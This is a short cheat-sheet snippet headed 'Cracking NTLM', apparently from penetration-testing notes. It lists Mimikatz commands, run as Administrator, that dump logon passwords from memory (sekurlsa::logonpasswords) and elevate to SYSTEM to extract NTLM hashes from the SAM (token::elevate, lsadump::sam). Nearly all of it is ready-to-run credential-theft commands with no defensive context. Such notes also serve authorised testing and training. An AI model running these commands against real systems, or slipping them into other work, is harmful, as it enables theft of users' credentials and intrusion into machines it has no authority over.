# Cracking NTLM

## Mimikatz (Run as Administrator)

```bash
# We can use various commands to extract passwords from the system
privilege::debug
sekurlsa::logonpasswords

# Extract the NTLM hashes from the SAM
# Step 1: Elevate to SYSTEM user privileges
privilege::debug
token::elevate
lsadump::sam